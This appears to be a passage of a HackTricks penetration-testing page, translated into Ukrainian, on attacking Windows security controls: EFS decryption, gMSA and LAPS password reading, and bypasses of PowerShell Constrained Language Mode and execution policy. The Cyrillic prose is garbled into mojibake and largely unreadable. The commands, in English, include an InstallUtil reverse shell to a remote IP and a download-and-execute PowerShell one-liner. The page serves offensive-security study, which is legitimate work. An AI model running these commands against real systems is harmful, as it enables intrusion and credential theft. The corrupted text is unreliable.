–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á** **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤** —Ü–µ–π **—Å–µ—Ä–≤—ñ—Å**, –ø–µ—Ä–µ–≤—ñ—Ä–∏–≤—à–∏, —á–∏ —ñ—Å–Ω—É—î —Ü–µ–π —à–ª—è—Ö: `C:\users\<—ñ–º'—è_–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞>\appdata\roaming\Microsoft\Protect`

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, **—Ö—Ç–æ** –º–∞—î **–¥–æ—Å—Ç—É–ø** –¥–æ —Ñ–∞–π–ª—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `cipher /c \<—Ñ–∞–π–ª>\`
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `cipher /e` —Ç–∞ `cipher /d` –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–∞–ø–∫–∏ –¥–ª—è **—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è** —Ç–∞ **—Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è** –≤—Å—ñ—Ö —Ñ–∞–π–ª—ñ–≤

### –†–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ EFS

#### –ë—É—Ç–∏ —Å–∏—Å—Ç–µ–º–æ—é –∞–≤—Ç–æ—Ä–∏—Ç–µ—Ç—É

–î–ª—è —Ü—å–æ–≥–æ —Å–ø–æ—Å–æ–±—É **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∂–µ—Ä—Ç–≤–∞** –ø–æ–≤–∏–Ω–µ–Ω **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏** –ø—Ä–æ—Ü–µ—Å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ö–æ—Å—Ç–∞. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Å–µ—Å—ñ—ó `meterpreter`, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ —Ç–æ–∫–µ–Ω –ø—Ä–æ—Ü–µ—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (`impersonate_token` –∑ `incognito`). –ê–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ `migrate` –¥–æ –ø—Ä–æ—Ü–µ—Å—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.

#### –ó–Ω–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## –ö–µ—Ä–æ–≤–∞–Ω—ñ –≥—Ä—É–ø–æ–≤—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–± (gMSA)

Microsoft —Ä–æ–∑—Ä–æ–±–∏–≤ **–ö–µ—Ä–æ–≤–∞–Ω—ñ –≥—Ä—É–ø–æ–≤—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ —Å–ª—É–∂–± (gMSA)** –¥–ª—è —Å–ø—Ä–æ—â–µ–Ω–Ω—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ —Å–ª—É–∂–± –≤ –Ü–¢-—ñ–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–∞—Ö. –ù–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥ —Ç—Ä–∞–¥–∏—Ü—ñ–π–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±, —É —è–∫–∏—Ö —á–∞—Å—Ç–æ –≤–∫–ª—é—á–µ–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è "**–ü–∞—Ä–æ–ª—å –Ω—ñ–∫–æ–ª–∏ –Ω–µ –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è**", gMSA –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å –±—ñ–ª—å—à –±–µ–∑–ø–µ—á–Ω–µ —Ç–∞ –∫–µ—Ä–æ–≤–∞–Ω–µ —Ä—ñ—à–µ–Ω–Ω—è:

* **–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –ø–∞—Ä–æ–ª—è–º–∏**: gMSA –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Å–∫–ª–∞–¥–Ω–∏–π –ø–∞—Ä–æ–ª—å —É 240 —Å–∏–º–≤–æ–ª—ñ–≤, —è–∫–∏–π –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∑–º—ñ–Ω—é—î—Ç—å—Å—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ –ø–æ–ª—ñ—Ç–∏–∫–∏ –¥–æ–º–µ–Ω—É –∞–±–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞. –¶–µ–π –ø—Ä–æ—Ü–µ—Å –æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è –°–ª—É–∂–±–æ—é —Ä–æ–∑–ø–æ–¥—ñ–ª—É –∫–ª—é—á—ñ–≤ Microsoft (KDC), —â–æ —É—Å—É–≤–∞—î –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ—Å—Ç—å –≤—Ä—É—á–Ω–∏—Ö –æ–Ω–æ–≤–ª–µ–Ω—å –ø–∞—Ä–æ–ª—è.
* **–ü—ñ–¥–≤–∏—â–µ–Ω–µ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è**: –¶—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –Ω–µ –ø—ñ–¥–¥–∞—é—Ç—å—Å—è –±–ª–æ–∫—É–≤–∞–Ω–Ω—é —Ç–∞ –Ω–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∏—Ö –≤—Ö–æ–¥—ñ–≤, –ø—ñ–¥–≤–∏—â—É—é—á–∏ —ó—Ö –±–µ–∑–ø–µ–∫—É.
* **–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ –∫—ñ–ª—å–∫–æ—Ö —Ö–æ—Å—Ç—ñ–≤**: gMSA –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –Ω–∞ –∫—ñ–ª—å–∫–æ—Ö —Ö–æ—Å—Ç–∞—Ö, —â–æ —Ä–æ–±–∏—Ç—å —ó—Ö —ñ–¥–µ–∞–ª—å–Ω–∏–º–∏ –¥–ª—è —Å–ª—É–∂–±, —è–∫—ñ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –∫—ñ–ª—å–∫–æ—Ö —Å–µ—Ä–≤–µ—Ä–∞—Ö.
* **–ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å**: –ù–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥ –∫–µ—Ä–æ–≤–∞–Ω–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±, gMSA –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å –∑–∞–ø—É—Å–∫ –∑–∞–ø–ª–∞–Ω–æ–≤–∞–Ω–∏—Ö –∑–∞–≤–¥–∞–Ω—å.
* **–°–ø—Ä–æ—â–µ–Ω–µ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è SPN**: –°–∏—Å—Ç–µ–º–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –æ–Ω–æ–≤–ª—é—î —ñ–º'—è —Å–ª—É–∂–±–æ–≤–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—É (SPN), –∫–æ–ª–∏ –≤—ñ–¥–±—É–≤–∞—é—Ç—å—Å—è –∑–º—ñ–Ω–∏ –≤ –¥–µ—Ç–∞–ª—è—Ö sAMaccount –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –∞–±–æ DNS-—ñ–º–µ–Ω—ñ, —Å–ø—Ä–æ—â—É—é—á–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è SPN.

–ü–∞—Ä–æ–ª—ñ –¥–ª—è gMSA –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ LDAP _**msDS-ManagedPassword**_ —Ç–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ —Å–∫–∏–¥–∞—é—Ç—å—Å—è –∫–æ–∂–Ω—ñ 30 –¥–Ω—ñ–≤ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∞–º–∏ –¥–æ–º–µ–Ω—ñ–≤ (DC). –¶–µ–π –ø–∞—Ä–æ–ª—å, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –±–ª–æ–∫ –¥–∞–Ω–∏—Ö, –≤—ñ–¥–æ–º–∏–π —è–∫ [MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), –º–æ–∂–µ –±—É—Ç–∏ –æ—Ç—Ä–∏–º–∞–Ω–∏–π –ª–∏—à–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–º–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º–∏ —Ç–∞ —Å–µ—Ä–≤–µ—Ä–∞–º–∏, –Ω–∞ —è–∫–∏—Ö –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ gMSA, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –±–µ–∑–ø–µ—á–Ω–µ —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ. –î–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ü—ñ—î—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–æ—Ç—Ä—ñ–±–Ω–µ –∑–∞—Ö–∏—â–µ–Ω–µ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è, —Ç–∞–∫–µ —è–∫ LDAPS, –∞–±–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é 'Sealing & Secure'.
```
/GMSAPasswordReader --AccountName jkohler
```
[**–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —É —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://cube0x0.github.io/Relaying-for-gMSA/)

–¢–∞–∫–æ–∂ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü—é [–≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫—É](https://cube0x0.github.io/Relaying-for-gMSA/) –ø—Ä–æ —Ç–µ, —è–∫ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫—É **–ø–µ—Ä–µ—Å–∏–ª–∞–Ω–Ω—è NTLM** –¥–ª—è **—á–∏—Ç–∞–Ω–Ω—è** **–ø–∞—Ä–æ–ª—è** **gMSA**.

## LAPS

**–†—ñ—à–µ–Ω–Ω—è –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—Å—å–∫–æ–≥–æ –ø–∞—Ä–æ–ª—è (LAPS)**, –¥–æ—Å—Ç—É–ø–Ω–µ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑ [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), –¥–æ–∑–≤–æ–ª—è—î –∫–µ—Ä—É–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—è–º–∏ –ª–æ–∫–∞–ª—å–Ω–∏—Ö –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤. –¶—ñ –ø–∞—Ä–æ–ª—ñ, —è–∫—ñ —î **–≤–∏–ø–∞–¥–∫–æ–≤–∏–º–∏**, —É–Ω—ñ–∫–∞–ª—å–Ω–∏–º–∏ —Ç–∞ **—Ä–µ–≥—É–ª—è—Ä–Ω–æ –∑–º—ñ–Ω—é—é—Ç—å—Å—è**, –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è —Ü–µ–Ω—Ç—Ä–∞–ª—ñ–∑–æ–≤–∞–Ω–æ –≤ Active Directory. –î–æ—Å—Ç—É–ø –¥–æ —Ü–∏—Ö –ø–∞—Ä–æ–ª—ñ–≤ –æ–±–º–µ–∂–µ–Ω–∏–π —á–µ—Ä–µ–∑ ACL –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤. –ó –¥–æ—Å—Ç–∞—Ç–Ω—ñ–º–∏ –Ω–∞–¥–∞–Ω–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –Ω–∞–¥–∞—î—Ç—å—Å—è –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —á–∏—Ç–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—ñ–≤ –ª–æ–∫–∞–ª—å–Ω–∏—Ö –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell [**–û–±–º–µ–∂–µ–Ω–∏–π —Ä–µ–∂–∏–º –º–æ–≤–∏**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **–±–ª–æ–∫—É—î –±–∞–≥–∞—Ç–æ —Ñ—É–Ω–∫—Ü—ñ–π**, –Ω–µ–æ–±—Ö—ñ–¥–Ω–∏—Ö –¥–ª—è –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è PowerShell, —Ç–∞–∫–∏—Ö —è–∫ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è –æ–±'—î–∫—Ç—ñ–≤ COM, –¥–æ–∑–≤—ñ–ª –ª–∏—à–µ —Å—Ö–≤–∞–ª–µ–Ω–∏—Ö —Ç–∏–ø—ñ–≤ .NET, —Ä–æ–±–æ—á—ñ –ø—Ä–æ—Ü–µ—Å–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ XAML, –∫–ª–∞—Å–∏ PowerShell —Ç–∞ —ñ–Ω—à–µ.

### **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### –û–±—Ö—ñ–¥
```powershell
#Easy bypass
Powershell -version 2
```
–£ –ø–æ—Ç–æ—á–Ω—ñ–π –≤–µ—Ä—Å—ñ—ó Windows —Ü–µ–π –æ–±—Ö—ñ–¥ –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ, –∞–ª–µ –≤–∏ –º–æ–∂–µ—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**–î–ª—è –∫–æ–º–ø—ñ–ª—è—Ü—ñ—ó –º–æ–∂–ª–∏–≤–æ –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è** **–¥–æ–¥–∞—Ç–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è** -> _–ü–µ—Ä–µ–≥–ª—è–¥_ -> _–ü–µ—Ä–µ–≥–ª—è–¥_ -> –¥–æ–¥–∞—Ç–∏ `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` —ñ **–∑–º—ñ–Ω–∏—Ç–∏ –ø—Ä–æ–µ–∫—Ç –Ω–∞ .Net4.5**.

#### –ü—Ä—è–º–∏–π –æ–±—Ö—ñ–¥:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### –ó–≤–æ—Ä–æ—Ç–Ω—ñ–π —à–µ–ª:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) –∞–±–æ [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É Powershell** –≤ –±—É–¥—å-—è–∫–æ–º—É –ø—Ä–æ—Ü–µ—Å—ñ —Ç–∞ –æ–±—Ö—ñ–¥—É –æ–±–º–µ–∂–µ–Ω–æ–≥–æ —Ä–µ–∂–∏–º—É. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## –ü–æ–ª—ñ—Ç–∏–∫–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è PS

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–æ–Ω–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ **–æ–±–º–µ–∂–µ–Ω–∞.** –û—Å–Ω–æ–≤–Ω—ñ —Å–ø–æ—Å–æ–±–∏ –æ–±—Ö—ñ–¥—É —Ü—ñ—î—ó –ø–æ–ª—ñ—Ç–∏–∫–∏:
```powershell
1¬∫ Just copy and paste inside the interactive PS console
2¬∫ Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3¬∫ Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4¬∫ Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5¬∫ Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6¬∫ Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7¬∫ Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8¬∫ Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9¬∫ Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
–ë—ñ–ª—å—à–µ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [—Ç—É—Ç](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## –Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –±–µ–∑–ø–µ–∫–∏ (SSPI)

–¶–µ API, —è–∫–µ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.

SSPI –±—É–¥–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–∏–º –∑–∞ –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ–≥–æ –ø—Ä–æ—Ç–æ–∫–æ–ª—É –¥–ª—è –¥–≤–æ—Ö –º–∞—à–∏–Ω, —è–∫—ñ —Ö–æ—á—É—Ç—å —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è. –ù–∞–π–±–∞–∂–∞–Ω—ñ—à–∏–π –º–µ—Ç–æ–¥ –¥–ª—è —Ü—å–æ–≥–æ - Kerberos. –ü–æ—Ç—ñ–º SSPI –±—É–¥–µ –≤–µ—Å—Ç–∏ –ø–µ—Ä–µ–≥–æ–≤–æ—Ä–∏ –ø—Ä–æ —Ç–µ, —è–∫–∏–π –ø—Ä–æ—Ç–æ–∫–æ–ª –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è; —Ü—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –Ω–∞–∑–∏–≤–∞—é—Ç—å—Å—è –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞–º–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –±–µ–∑–ø–µ–∫–∏ (SSP), –≤–æ–Ω–∏ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω—ñ —É –∫–æ–∂–Ω—ñ–π –º–∞—à–∏–Ω—ñ –∑ Windows —É –≤–∏–≥–ª—è–¥—ñ DLL, —ñ –æ–±–∏–¥–≤—ñ –º–∞—à–∏–Ω–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –æ–¥–Ω–∞–∫–æ–≤—ñ, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Å–ø—ñ–ª–∫—É–≤–∞—Ç–∏—Å—è.

### –û—Å–Ω–æ–≤–Ω—ñ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –±–µ–∑–ø–µ–∫–∏ (SSP)

* **Kerberos**: –ù–∞–π–±–∞–∂–∞–Ω—ñ—à–∏–π
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** —Ç–∞ **NTLMv2**: –ó –ø—Ä–∏—á–∏–Ω —Å—É–º—ñ—Å–Ω–æ—Å—Ç—ñ
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: –í–µ–±-—Å–µ—Ä–≤–µ—Ä–∏ —Ç–∞ LDAP, –ø–∞—Ä–æ–ª—å —É –≤–∏–≥–ª—è–¥—ñ —Ö–µ—à—É MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL —Ç–∞ TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø–µ—Ä–µ–≥–æ–≤–æ—Ä—ñ–≤ —â–æ–¥–æ –ø—Ä–æ—Ç–æ–∫–æ–ª—É, —è–∫–∏–π —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ (Kerberos –∞–±–æ NTLM, –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Kerberos)
* %windir%\Windows\System32\lsasrv.dll

#### –ü—ñ–¥ —á–∞—Å –ø–µ—Ä–µ–≥–æ–≤–æ—Ä—ñ–≤ –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–æ –∫—ñ–ª—å–∫–∞ –º–µ—Ç–æ–¥—ñ–≤ –∞–±–æ –ª–∏—à–µ –æ–¥–∏–Ω.

## UAC - –ö–æ–Ω—Ç—Ä–æ–ª—å –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

[–ö–æ–Ω—Ç—Ä–æ–ª—å –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) - —Ü–µ —Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î **–∑–∞–ø–∏—Ç –Ω–∞ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–∏—Ö –¥—ñ–π**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), —â–æ–± –ª–µ–≥–∫–æ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Ç–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ —Ä–æ–±–æ—á—ñ –ø—Ä–æ—Ü–µ—Å–∏** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞–π–±—ñ–ª—å—à **–ø—Ä–æ–¥–≤–∏–Ω—É—Ç–∏—Ö** —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ —Å–ø—ñ–ª—å–Ω–æ—Ç–∏ —É —Å–≤—ñ—Ç—ñ.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Å—å–æ–≥–æ–¥–Ω—ñ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
